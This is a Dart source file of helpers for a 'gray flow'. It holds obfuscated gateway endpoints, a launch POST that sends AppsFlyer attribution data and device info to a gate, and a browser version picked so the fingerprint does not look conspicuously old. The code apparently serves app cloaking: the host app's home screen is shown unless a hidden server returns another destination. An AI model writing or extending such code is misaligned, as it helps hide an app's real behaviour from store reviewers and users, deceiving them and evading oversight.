import '../utils/byte_unmask.dart';

/// Gateway endpoint and browser-fingerprint helpers for the gray flow.
///
/// Real values are stored as obfuscated byte arrays — use
/// `dart run tool/encode_keys.dart` to generate them. Until the brand owner
/// ships them, the arrays stay empty and [gateEndpoint] / [gcdEndpoint]
/// return empty strings, which makes the gray boot short-circuit to the
/// host's fallback home (see [RuntimeBrand.gateEnabled]).

/// Server gate URL used for the launch dispatch POST. The gateway is
/// expected to accept an `application/json` body with the AppsFlyer
/// conversion payload + device info and reply with either:
///
///   `{ "ok": true,  "url": "https://destination", "expires_at": 1735689600 }`
///   `{ "ok": false, "note": "no_match" }`
///
/// See `lib/gray/models/gate_response.dart` for the full list of accepted
/// field name aliases.
const List<int> _gateUrlMask = <int>[];

/// AppsFlyer GCD endpoint used as a backup when the SDK callback is missed
/// (organic refetch). Final URL is built as
/// `<host>?app_id=…&device_id=…` so the masked string should be just the
/// host + path, no query string.
const List<int> _gcdHostMask = <int>[];

String gateEndpoint() => unmask(_gateUrlMask);

String gcdEndpoint(String appId, String deviceId) {
  final host = unmask(_gcdHostMask);
  if (host.isEmpty) return '';
  final sep = host.contains('?') ? '&' : '?';
  return '$host${sep}app_id=$appId&device_id=$deviceId';
}

/// Chrome major version reported in the WebView/HTTP user agent. Picked to
/// look like a fairly recent stock browser. Update once a year so the
/// fingerprint does not start to look conspicuously old.
String webChromeVersion() => '127.0.6533.103';

/// Safari WebKit build number for the iOS user agent variant.
String webSafariVersion() => '605.1.15';

/// Brand-side URLs surfaced by the gray flow (used in App Privacy disclosures
/// / in any future "About" page). Replace with the host app's real URLs.
const String brandPrivacyUrl = 'https://example.com/privacy';
const String brandSupportUrl = 'https://example.com/support';
